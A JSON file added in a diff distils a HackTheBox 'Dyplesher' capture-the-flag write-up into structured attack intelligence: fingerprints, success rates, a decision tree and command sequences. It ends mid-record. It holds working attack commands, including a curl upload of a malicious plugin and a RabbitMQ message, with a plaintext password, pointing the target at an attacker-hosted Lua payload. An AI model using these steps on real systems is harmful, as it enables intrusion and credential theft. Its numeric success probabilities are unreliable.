@@ -1,0 +1,1245 @@
+{
+  "writeup_id": "Htb_Dyplesher",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_multi_service_memcache_gogs_minecraft",
+    "primary_services": [
+      "http",
+      "memcache",
+      "gogs",
+      "rabbitmq",
+      "minecraft"
+    ],
+    "port_signature": "22+80+3000+5672+11211+25565",
+    "service_combination": "apache+memcache+gogs+rabbitmq+minecraft",
+    "os_family": "linux_ubuntu",
+    "environment_type": "development_gaming_server",
+    "entry_vector": "git_directory_exposure",
+    "privilege_path": "memcache_creds_to_gogs_to_plugin_upload",
+    "attack_complexity": "insane",
+    "estimated_time": "4-6 hours",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "memcache_binary_protocol_auth",
+      "gogs_git_bundles",
+      "bukkit_plugin_upload",
+      "rabbitmq_message_interception"
+    ],
+    "environmental_clues": [
+      "virtual_host_git_exposure",
+      "minecraft_server_ports",
+      "erlang_port_mapper",
+      "multiple_high_ports"
+    ],
+    "similar_scenarios": [
+      "developer_workstation_compromise",
+      "gaming_server_takeover"
+    ],
+    "unique_aspects": [
+      "binary_memcache_protocol",
+      "cuberite_lua_plugins",
+      "traffic_capture_privilege_escalation",
+      "message_queue_exploitation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Git Directory Enumeration",
+        "success_reason": "Virtual host exposed .git directory with sensitive configuration",
+        "prerequisite_indicators": [
+          "web_server_accessible",
+          "virtual_hosts_present",
+          "git_repositories_deployed"
+        ],
+        "recognition_patterns": [
+          "/.git/config accessible",
+          "directory listing enabled",
+          "version control artifacts exposed"
+        ],
+        "failure_modes": [
+          "git_directory_protected",
+          "no_virtual_hosts",
+          "proper_deployment_process"
+        ],
+        "environmental_factors": [
+          "development_to_production_migration",
+          "insufficient_web_server_hardening",
+          "developer_deployment_practices"
+        ],
+        "success_probability": 0.73,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Memcache Binary Protocol Authentication",
+        "success_reason": "Credentials found in git config worked for authenticated memcache access",
+        "prerequisite_indicators": [
+          "memcache_port_open",
+          "binary_protocol_supported",
+          "authentication_enabled",
+          "credentials_available"
+        ],
+        "recognition_patterns": [
+          "port 11211 open",
+          "SASL authentication supported",
+          "credential reuse from other services"
+        ],
+        "failure_modes": [
+          "no_authentication_required",
+          "different_credentials",
+          "text_protocol_only"
+        ],
+        "environmental_factors": [
+          "modern_memcache_deployment",
+          "credential_reuse_practices",
+          "caching_layer_security"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "15-45 minutes"
+      },
+      {
+        "technique": "Git Bundle Analysis",
+        "success_reason": "Repository backups contained SQLite database with crackable password hashes",
+        "prerequisite_indicators": [
+          "git_bundles_accessible",
+          "custom_application_code",
+          "embedded_databases_present"
+        ],
+        "recognition_patterns": [
+          "*.bundle files in repositories",
+          "SQLite database files",
+          "weak password hashing algorithms"
+        ],
+        "failure_modes": [
+          "strong_password_hashing",
+          "no_embedded_credentials",
+          "encrypted_databases"
+        ],
+        "environmental_factors": [
+          "development_backup_practices",
+          "weak_cryptographic_implementations",
+          "embedded_database_usage"
+        ],
+        "success_probability": 0.58,
+        "typical_timeframe": "30-60 minutes"
+      },
+      {
+        "technique": "Bukkit Plugin Upload",
+        "success_reason": "Web dashboard allowed arbitrary plugin upload and execution",
+        "prerequisite_indicators": [
+          "minecraft_server_management_interface",
+          "plugin_upload_functionality",
+          "insufficient_input_validation"
+        ],
+        "recognition_patterns": [
+          "Bukkit/Spigot server indicators",
+          "plugin management interface",
+          "file upload without restrictions"
+        ],
+        "failure_modes": [
+          "plugin_signature_verification",
+          "upload_restrictions",
+          "sandboxed_execution"
+        ],
+        "environmental_factors": [
+          "gaming_server_administration",
+          "plugin_ecosystem_trust_model",
+          "insufficient_security_controls"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "20-40 minutes"
+      },
+      {
+        "technique": "Network Traffic Capture",
+        "success_reason": "User had access to dumpcap binary for packet capture",
+        "prerequisite_indicators": [
+          "dumpcap_binary_accessible",
+          "network_interface_permissions",
+          "cleartext_protocols_in_use"
+        ],
+        "recognition_patterns": [
+          "dumpcap in user PATH",
+          "network monitoring tools available",
+          "RabbitMQ traffic observable"
+        ],
+        "failure_modes": [
+          "encrypted_message_queues",
+          "no_capture_permissions",
+          "network_segmentation"
+        ],
+        "environmental_factors": [
+          "monitoring_tools_deployment",
+          "cleartext_internal_communications",
+          "insufficient_privilege_separation"
+        ],
+        "success_probability": 0.71,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Message Queue Injection",
+        "success_reason": "RabbitMQ accepted malicious plugin URLs for automatic download and execution",
+        "prerequisite_indicators": [
+          "message_queue_accessible",
+          "automated_plugin_processing",
+          "url_download_functionality"
+        ],
+        "recognition_patterns": [
+          "RabbitMQ credentials available",
+          "plugin download instructions",
+          "Cuberite server automation"
+        ],
+        "failure_modes": [
+          "url_validation_implemented",
+          "plugin_signature_verification",
+          "network_restrictions"
+        ],
+        "environmental_factors": [
+          "automated_deployment_systems",
+          "trust_in_message_queue_content",
+          "insufficient_input_validation"
+        ],
+        "success_probability": 0.69,
+        "typical_timeframe": "25-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Memcache credentials in git config",
+        "discovery_method": "Virtual host enumeration and .git directory access",
+        "why_critical": "Enabled authenticated access to memcache containing user credentials",
+        "how_to_recognize": [
+          "exposed .git directories",
+          "configuration files with credentials",
+          "service credential reuse patterns"
+        ],
+        "follow_up_actions": [
+          "test_memcache_authentication",
+          "dump_cached_credentials",
+          "test_credential_reuse"
+        ]
+      },
+      {
+        "discovery": "SQLite database in git bundle",
+        "discovery_method": "Git bundle extraction and file analysis",
+        "why_critical": "Contained crackable password hashes for web dashboard access",
+        "how_to_recognize": [
+          "*.db files in repositories",
+          "SQLite file signatures",
+          "user credential tables"
+        ],
+        "follow_up_actions": [
+          "extract_password_hashes",
+          "run_hashcat_cracking",
+          "test_web_authentication"
+        ]
+      },
+      {
+        "discovery": "dumpcap binary access",
+        "discovery_method": "User privilege enumeration",
+        "why_critical": "Allowed capture of RabbitMQ credentials in network traffic",
+        "how_to_recognize": [
+          "network monitoring tools available",
+          "packet capture permissions",
+          "cleartext protocol usage"
+        ],
+        "follow_up_actions": [
+          "capture_network_traffic",
+          "analyze_message_queue_communications",
+          "extract_credentials_from_packets"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_user",
+        "escalation_method": "Plugin_Upload_to_Shell",
+        "why_possible": "Web dashboard allowed arbitrary Bukkit plugin upload and execution",
+        "recognition_signs": [
+          "plugin_management_interface",
+          "file_upload_functionality",
+          "minecraft_server_administration"
+        ],
+        "exploitation_path": "Craft malicious plugin → Upload via dashboard → Execute for shell access"
+      },
+      {
+        "privilege_level": "limited_user",
+        "escalation_method": "Traffic_Capture_to_Credentials",
+        "why_possible": "User had dumpcap access and cleartext protocols revealed credentials",
+        "recognition_signs": [
+          "dumpcap_binary_available",
+          "network_capture_permissions",
+          "cleartext_message_queue_traffic"
+        ],
+        "exploitation_path": "Capture traffic → Extract RabbitMQ credentials → Access message queue"
+      },
+      {
+        "privilege_level": "message_queue_user",
+        "escalation_method": "Queue_Injection_to_Root",
+        "why_possible": "Automated system processed malicious plugin URLs from message queue",
+        "recognition_signs": [
+          "automated_plugin_processing",
+          "url_download_functionality",
+          "cuberite_server_automation"
+        ],
+        "exploitation_path": "Inject malicious URL → System downloads plugin → Lua script executes as root"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found multiple services including memcache (11211), Gogs (3000), and web server (80)",
+        "decision": "Enumerate web services first to find credentials for protected services",
+        "reasoning": "Memcache connection hangs suggesting authentication required, web services more likely to reveal credentials",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "brute_force_memcache",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "gogs_enumeration",
+            "when": "if accessible without credentials"
+          }
+        ],
+        "success_indicators": [
+          "virtual_hosts_discovered",
+          "git_directories_found",
+          "credential_files_located"
+        ],
+        "next_decision": "enumerate_virtual_hosts"
+      },
+      {
+        "step": 2,
+        "situation": "Found virtual host test.dyplesher.htb with .git directory",
+        "decision": "Extract credentials from git repository for memcache access",
+        "reasoning": "Git repositories often contain configuration files with hardcoded credentials",
+        "confidence": 0.9,
+        "prerequisites": [
+          "virtual_host_accessible",
+          "git_directory_readable"
+        ],
+        "success_indicators": [
+          "memcache_credentials_found",
+          "config_files_discovered"
+        ],
+        "failure_fallbacks": [
+          "directory_bruteforce",
+          "source_code_analysis"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Obtained memcache credentials from git repository",
+        "decision": "Use binary memcache protocol with SASL authentication",
+        "reasoning": "Modern memcache implementations use binary protocol for authentication",
+        "confidence": 0.8,
+        "prerequisites": [
+          "memcache_credentials_available"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "data_dump_possible"
+        ],
+        "failure_fallbacks": [
+          "text_protocol_attempt",
+          "credential_validation"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Successfully dumped usernames and passwords from memcache",
+        "decision": "Use credentials to access Gogs instance for further enumeration",
+        "reasoning": "Gogs likely contains source code and additional attack vectors",
+        "confidence": 0.95,
+        "prerequisites": [
+          "valid_credentials_obtained"
+        ],
+        "success_indicators": [
+          "gogs_login_successful",
+          "repositories_accessible"
+        ],
+        "failure_fallbacks": [
+          "credential_spraying",
+          "other_service_authentication"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_git_directory_found": {
+        "action": "extract_all_files_and_history",
+        "tools": [
+          "wget",
+          "git",
+          "grep"
+        ],
+        "next_phase": "credential_extraction"
+      },
+      "if_memcache_accessible": {
+        "action": "dump_all_cached_data",
+        "tools": [
+          "custom_binary_client",
+          "memcached_tool"
+        ],
+        "next_phase": "credential_harvesting"
+      },
+      "if_gogs_access_obtained": {
+        "action": "enumerate_all_repositories",
+        "purpose": "find_additional_credentials_and_code",
+        "tools": [
+          "git",
+          "grep",
+          "find"
+        ]
+      },
+      "if_application_upload_found": {
+        "action": "develop_malicious_plugin",
+        "purpose": "achieve_code_execution",
+        "tools": [
+          "custom_development",
+          "reverse_shells"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_git_directories_on_web_servers",
+        "reasoning": "high_probability_of_credential_exposure",
+        "applicability": "web_application_enumeration"
+      },
+      {
+        "rule": "use_binary_protocol_for_authenticated_memcache",
+        "reasoning": "modern_implementations_require_sasl_auth",
+        "applicability": "memcache_with_authentication"
+      },
+      {
+        "rule": "enumerate_all_virtual_hosts_thoroughly",
+        "reasoning": "different_vhosts_may_expose_different_attack_surfaces",
+        "applicability": "multi_service_web_applications"
+      },
+      {
+        "rule": "prioritize_application_specific_exploits_over_generic",
+        "reasoning": "custom_applications_often_have_unique_vulnerabilities",
+        "applicability": "specialized_applications_like_minecraft_gogs"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Git Directory Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "git_repository_exposed",
+          "directory_listing_enabled_or_predictable_paths"
+        ],
+        "success_indicators": [
+          "git_directory_accessible",
+          "config_files_readable",
+          "commit_history_available"
+        ],
+        "incompatible_with": [
+          "git_directory_protected",
+          "web_server_disabled",
+          "strict_access_controls"
+        ],
+        "confidence_boosters": [
+          "development_environment",
+          "misconfigured_deployment",
+          "backup_directories_present"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Memcache Enumeration",
+        "mitre_id": "T1040",
+        "required_services": [
+          "memcache"
+        ],
+        "required_ports": [
+          11211
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "memcache_service_running",
+          "network_access_to_memcache_port",
+          "authentication_credentials_available"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "cached_data_accessible",
+          "sensitive_information_in_cache"
+        ],
+        "incompatible_with": [
+          "memcache_authentication_required_without_creds",
+          "network_isolation",
+          "cache_encryption_enabled"
+        ],
+        "confidence_boosters": [
+          "default_configuration",
+          "development_environment",
+          "cached_credentials_present"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Gogs Repository Enumeration",
+        "mitre_id": "T1213",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          3000,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "gogs_service_running",
+          "public_repositories_available",
+          "user_credentials_obtained"
+        ],
+        "success_indicators": [
+          "repository_access_granted",
+          "source_code_accessible",
+          "configuration_files_found"
+        ],
+        "incompatible_with": [
+          "all_repositories_private",
+          "strong_authentication_required",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "public_repositories_present",
+          "weak_authentication",
+          "development_secrets_in_repos"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "20-60 minutes"
+      },
+      {
+        "technique": "Plugin Upload RCE",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_plugin_support",
+          "file_upload_functionality",
+          "administrative_access_obtained"
+        ],
+        "success_indicators": [
+          "malicious_plugin_uploaded",
+          "plugin_execution_successful",
+          "code_execution_achieved"
+        ],
+        "incompatible_with": [
+          "file_upload_restrictions",
+          "plugin_validation_enabled",
+          "sandboxed_execution"
+        ],
+        "confidence_boosters": [
+          "bukkit_minecraft_server",
+          "administrative_dashboard_access",
+          "weak_file_validation"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "30-90 minutes"
+      },
+      {
+        "technique": "Network Traffic Capture",
+        "mitre_id": "T1040",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "packet_capture_tools_available",
+          "network_interface_access",
+          "sufficient_privileges"
+        ],
+        "success_indicators": [
+          "traffic_capture_successful",
+          "sensitive_data_in_packets",
+          "credentials_extracted"
+        ],
+        "incompatible_with": [
+          "encrypted_traffic_only",
+          "network_isolation",
+          "insufficient_privileges"
+        ],
+        "confidence_boosters": [
+          "dumpcap_binary_available",
+          "unencrypted_protocols",
+          "message_queue_traffic"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Message Queue Exploitation",
+        "mitre_id": "T1557",
+        "required_services": [
+          "amqp",
+          "rabbitmq"
+        ],
+        "required_ports": [
+          5672,
+          25672
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "message_queue_service_running",
+          "queue_access_credentials",
+          "message_processing_system"
+        ],
+        "success_indicators": [
+          "queue_access_successful",
+          "malicious_message_sent",
+          "remote_code_execution"
+        ],
+        "incompatible_with": [
+          "queue_authentication_required",
+          "message_validation_strict",
+          "isolated_processing"
+        ],
+        "confidence_boosters": [
+          "rabbitmq_service_detected",
+          "automated_message_processing",
+          "plugin_download_mechanism"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "45-120 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "git_repository": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          ".git",
+          "git-upload-pack",
+          "git-receive-pack"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "memcache_service": {
+        "port_indicators": [
+          11211
+        ],
+        "service_indicators": [
+          "memcache"
+        ],
+        "banner_indicators": [
+          "memcached",
+          "VERSION"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "gogs_service": {
+        "port_indicators": [
+          3000,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Gogs",
+          "i_like_gogs",
+          "painless self-hosted Git"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "minecraft_server": {
+        "port_indicators": [
+          25565,
+          25562
+        ],
+        "service_indicators": [
+          "minecraft"
+        ],
+        "banner_indicators": [
+          "minecraft",
+          "bukkit",
+          "cuberite"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "rabbitmq_service": {
+        "port_indicators": [
+          5672,
+          25672,
+          4369
+        ],
+        "service_indicators": [
+          "amqp",
+          "epmd"
+        ],
+        "banner_indicators": [
+          "RabbitMQ",
+          "rabbit@",
+          "AMQPLAIN"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "git_directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "often_exposes_credentials_and_source_code"
+        },
+        {
+          "attack": "memcache_enumeration",
+          "when": "memcache_service_detected",
+          "reason": "frequently_contains_cached_credentials"
+        },
+        {
+          "attack": "gogs_repository_access",
+          "when": "gogs_service_detected",
+          "reason": "source_code_often_contains_secrets"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "plugin_upload_rce",
+          "when": "administrative_access_obtained",
+          "reason": "reliable_code_execution_method"
+        },
+        {
+          "attack": "network_traffic_capture",
+          "when": "packet_capture_tools_available",
+          "reason": "can_reveal_unencrypted_credentials"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "message_queue_exploitation",
+          "when": "rabbitmq_detected_and_credentials_available",
+          "reason": "complex_but_powerful_when_successful"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Git Directory Enumeration",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "gobuster",
+            "command_template": "gobuster dir -u {url} -w {wordlist} -x {extensions}",
+            "actual_command": "gobuster dir -u http://dyplesher.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php",
+            "output_pattern": "/.git (Status: 301)",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "web_application_accessible",
+          "git_directory_exposed"
+        ],
+        "success_indicators": [
+          "git_directory_found",
+          "credentials_extracted_from_git_files"
+        ],
+        "common_failures": [
+          "git_directory_not_exposed",
+          "git_files_empty_or_corrupted"
+        ],
+        "follow_up_techniques": [
+          "credential_extraction",
+          "source_code_analysis"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Memcache Binary Protocol Authentication",
+        "mitre_id": "T1078",
+        "category": "credential_access",
+        "phase": "lateral_movement",
+        "tools_used": [
+          {
+            "name": "custom_python_script",
+            "command_template": "python3 memcache_auth.py -h {host} -p {port} -u {username} -P {password}",
+            "actual_command": "python3 memcache_auth.py -h 10.10.10.190 -p 11211 -u memcache -P memcache",
+            "output_pattern": "Authentication successful",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "memcache_service_accessible",
+          "valid_credentials_obtained",
+          "binary_protocol_support"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "data_dump_retrieved",
+          "usernames_passwords_extracted"
+        ],
+        "common_failures": [
+          "text_protocol_attempted_instead_of_binary",
+          "invalid_credentials",
+          "service_not_accessible"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "service_enumeration"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Git Bundle Analysis",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "collection",
+        "tools_used": [
+          {
+            "name": "git",
+            "command_template": "git clone {bundle_file} {output_dir}",
+            "actual_command": "git clone bundle1.git extracted_repo",
+            "output_pattern": "Cloning into 'extracted_repo'...",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "sqlite3",
+            "command_template": "sqlite3 {database_file} 'SELECT * FROM {table};'",
+            "actual_command": "sqlite3 users.db 'SELECT * FROM users;'",
+            "output_pattern": "username|password_hash",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "git_bundles_accessible",
+          "sqlite_database_present",
+          "password_hashes_stored"
+        ],
+        "success_indicators": [
+          "bundles_successfully_cloned",
+          "database_files_extracted",
+          "password_hashes_retrieved"
+        ],
+        "common_failures": [
+          "corrupted_bundle_files",
+          "encrypted_databases",
+          "empty_repositories"
+        ],
+        "follow_up_techniques": [
+          "hash_cracking",
+          "credential_testing"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Bukkit Plugin Malicious Upload",
+        "mitre_id": "T1105",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "custom_java_plugin",
+            "command_template": "javac -cp bukkit.jar {plugin_name}.java && jar cf {plugin_name}.jar {plugin_name}.class plugin.yml",
+            "actual_command": "javac -cp bukkit.jar MaliciousPlugin.java && jar cf malicious.jar MaliciousPlugin.class plugin.yml",
+            "output_pattern": "Plugin uploaded successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "bukkit_server_dashboard_access",
+          "plugin_upload_functionality",
+          "java_compilation_environment"
+        ],
+        "success_indicators": [
+          "plugin_uploaded_successfully",
+          "webshell_written_to_filesystem",
+          "ssh_key_deployed"
+        ],
+        "common_failures": [
+          "plugin_validation_blocks_upload",
+          "insufficient_permissions",
+          "compilation_errors"
+        ],
+        "follow_up_techniques": [
+          "webshell_access",
+          "ssh_key_authentication"
+        ],
+        "time_investment": "30-60 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Network Traffic Capture with Dumpcap",
+        "mitre_id": "T1040",
+        "category": "credential_access",
+        "phase": "collection",
+        "tools_used": [
+          {
+            "name": "dumpcap",
+            "command_template": "dumpcap -i {interface} -w {output_file} -f 'port {port}'",
+            "actual_command": "dumpcap -i lo -w capture.pcap -f 'port 5672'",
+            "output_pattern": "Packets captured: X",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "wireshark",
+            "command_template": "tshark -r {pcap_file} -Y '{filter}' -T fields -e {field}",
+            "actual_command": "tshark -r capture.pcap -Y 'amqp' -T fields -e amqp.method.arguments",
+            "output_pattern": "username:password",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "dumpcap_binary_accessible",
+          "network_traffic_present",
+          "appropriate_capture_permissions"
+        ],
+        "success_indicators": [
+          "traffic_successfully_captured",
+          "credentials_extracted_from_packets",
+          "rabbitmq_messages_decoded"
+        ],
+        "common_failures": [
+          "insufficient_permissions",
+          "no_relevant_traffic",
+          "encrypted_communications"
+        ],
+        "follow_up_techniques": [
+          "credential_testing",
+          "message_queue_exploitation"
+        ],
+        "time_investment": "20-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "RabbitMQ Message Queue Exploitation",
+        "mitre_id": "T1559",
+        "category": "execution",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "custom_python_publisher",
+            "command_template": "python3 rabbitmq_publisher.py -h {host} -u {username} -p {password} -q {queue} -m '{message}'",
+            "actual_command": "python3 rabbitmq_publisher.py -h 10.10.10.190 -u yuntao -p EashAnicOc3Op -q plugin_download -m 'http://10.10.14.5/malicious_plugin.lua'",
+            "output_pattern": "Message published successfully",
+            "effectiveness_rating": 5,
+            "reliability": 0.8
+          }
+        ],
+        "prerequisites": [
+          "rabbitmq_credentials_obtained",
+          "message_queue_accessible",
+          "plugin_download_mechanism_identified"
+        ],
+        "success_indicators": [
+          "message_successfully_published",
+          "malicious_plugin_downloaded",
+          "code_execution_achieved"
+        ],
+        "common_failures": [
+          "queue_permissions_insufficient",
+          "message_format_incorrect",
+          "download_mechanism_blocked"
+        ],
+        "follow_up_techniques": [
+          "lua_script_execution",
+          "privilege_escalation"
+        ],
+        "time_investment": "45-90 minutes",
+        "skill_level": "advanced"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "wfuzz"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists",
+          "include_common_extensions",
+          "adjust_threads_for_target_stability"
+        ]
+      },
+      {
+        "tool": "dumpcap",
+        "use_case": "network_traffic_capture",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "network_analysis",
+          "credential_harvesting"
+        ],
+        "alternatives": [
+          "tcpdump",
+          "wireshark"
+        ],
+        "best_practices": [
+          "target_specific_ports_or_protocols",
+          "ensure_sufficient_disk_space",
+          "monitor_capture_duration"
+        ]
+      },
+      {
+        "tool": "sqlite3",
+        "use_case": "database_analysis",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "data_extraction",
+          "credential_harvesting"
+        ],
+        "alternatives": [
+          "sqlitebrowser",
+          "db_browser"
+        ],
+        "best_practices": [
+          "dump_all_tables_initially",
+          "look_for_password_hashes",
+          "check_for_sensitive_configuration_data"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "git_to_memcache_access",
+        "steps": [
+          {
+            "step": 1,
+            "command": "gobuster dir -u http://test.dyplesher.htb -w /usr/share/wordlists/common.txt",
+            "purpose": "Find exposed .git directory",
+            "expected_output": "/.git directory found"
+          },
+          {
+            "step": 2,
+            "command": "wget -r http://test.dyplesher.htb/.git/",
+            "purpose": "Download git repository files",
+            "expected_output": "Git files downloaded"
+          },
+          {
+            "step": 3,
+            "command": "git log --oneline",
+            "purpose": "Review commit history for credentials",
+            "expected_output": "Memcache credentials in commit"
+          },
+          {
+            "step": 4,
+            "command": "python3 memcache_binary_auth.py -h 10.10.10.190 -p 11211 -u memcache -P memcache",
+            "purpose": "Authenticate to memcache using binary protocol",
+            "expected_output": "Authentication successful, data dumped"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "20-30 minutes"
+      },
+      {
+        "sequence_name": "bukkit_plugin_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "javac -cp bukkit.jar MaliciousPlugin.java",
+            "purpose": "Compile malicious Bukkit plugin",
+            "expected_output": "Compilation successful"
+          },
+          {
+            "step": 2,
+            "command": "jar cf malicious.jar MaliciousPlugin.class plugin.yml",
+            "purpose": "Package plugin into JAR file",
+            "expected_output": "JAR file created"
+          },
+          {
+            "step": 3,
+            "command": "curl -X POST -F 'plugin=@malicious.jar' http://dashboard.dyplesher.htb/upload",
+            "purpose": "Upload malicious plugin",
+            "expected_output": "Plugin uploaded and executed"
+          },
+          {
+            "step": 4,
+            "command": "ssh -i malicious_key user@10.10.10.190",
+            "purpose": "Access system via deployed SSH key",
+            "expected_output": "Shell access as user"
+          }
+        ],
+        "success_rate": 0.8,
+        "typical_duration": "45-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Dyplesher",
+      "difficulty": "Insane",
+      "os": "Linux",
+      "platform": "HackTheBox",
+      "release_date": "2020-05-23",
+      "author": "felamos, yuntao",
+      "estimated_time": "6-8 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "very_high",
+      "skill_level_required": "expert",
+      "primary_attack_vectors": [
+        "git_exposure",
+        "memcache_protocol",
+        "plugin_upload",
+        "traffic_analysis"
+      ],
+      "key_vulnerabilities": [
+        "exposed_git_directory",
+        "memcache_credential_storage",
+        "plugin_execution",
+        "message_queue_interception"
+      ],
+      "environment_type": "modern_web_application_stack",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "binary_protocols",
+        "git_forensics",
+        "plugin_development",
+        "message_queues",
+        "traffic_analysis"
+      ],
+      "prerequisite_knowledge": [
+        "advanced_web_exploitation",
+        "binary_protocols",
+        "plugin_architectures",
+        "network_analysis"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "source_code_analysis",
+        "binary_protocols",
+        "plugin_exploitation",
+        "network_forensics"
+      ],
+      "attack_types": [
+        "information_disclosure",
+        "credential_access",
+        "code_execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_git_practices",
+        "memcache_security",
+        "plugin_sandboxing",
+        "network_segmentation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Craft",
+        "Player",
+        "Arkham"
+      ],
+      "similarity_reasons": [
+        "complex_attack_chain",
+        "modern_technologies",
+        "multiple_protocols",
+        "source_code_analysis"
+      ],
+      "unique_aspects": [
+        "memcache_binary_protocol",
+        "bukkit_plugins",
+        "cuberite_lua",
+        "rabbitmq_exploitation"
+      ],
+      "difficulty_factors": [
+        "multiple_complex_protocols",
+        "custom_plugin_development",
+        "traffic_analysis_required",
+        "long_attack_chain"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T00:54:14.431836",
+    "original_file": "0xdf_writeups/Htb Dyplesher.md",
+    "content_length": 92131,
